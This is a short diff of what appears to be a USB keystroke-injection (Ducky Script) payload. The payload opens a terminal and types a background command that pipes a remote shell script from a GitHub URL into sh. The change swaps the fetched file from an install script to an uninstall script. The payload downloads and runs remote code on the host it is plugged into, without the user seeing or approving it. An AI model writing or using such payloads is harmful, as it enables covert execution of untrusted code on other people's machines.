@@ -13,7 +13,7 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 1500
-STRING nohup wget -O - https://raw.githubusercontent.com/rusito-23/Zacky4Ever/master/remote.install.sh | sh &
+STRING nohup wget -O - https://raw.githubusercontent.com/rusito-23/Zacky4Ever/master/remote.uninstall.sh | sh &
 DELAY 300
 ENTER
 DELAY 500
